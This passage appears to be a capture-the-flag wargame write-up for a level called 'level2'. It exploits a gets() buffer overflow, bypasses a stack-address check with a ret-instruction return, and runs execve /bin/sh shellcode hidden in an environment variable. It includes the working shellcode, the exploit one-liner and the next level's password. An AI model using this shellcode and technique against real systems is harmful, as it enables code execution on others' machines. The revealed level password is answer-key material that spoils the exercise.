@@ -1,0 +1,30 @@
+We dissasemble the program and find a function 'p'
+
+it call thge function gets that we can overflow and use for the exploit 
+
+we also have this comp
+wich block us from directly returning to libc or shellcode by checking the address doesnt start by 0xb**
+
+0x080484fb <+39>:	and    $0xb0000000,%eax
+0x08048500 <+44>:	cmp    $0xb0000000,%eax
+
+so we will use the address of ret in fct p 0x0804853e this is where the program segfault 
+
+to exploit we will load a shellcode in env then find its memory adress with gdb
+
+export SC=$(python -c 'print("\x90"*500+"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80")')
+
+(gdb)x/200s environ 
+
+...
+0xbffffd2a:	 "SC=\220\220\220\220\220\220\220\220\220\220\220\..."
+...
+
+so we need to ret to any adress of \x90 in the shellcode
+
+we have OFFSET + ret Address + shellcode address
+
+(python -c 'print("A"*80+"\x08\x04\x85\x3e"[::-1]+"\xbf\xff\xfd\x31"[::-1])' ; cat)| ./level2
+cd ../level3 && cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
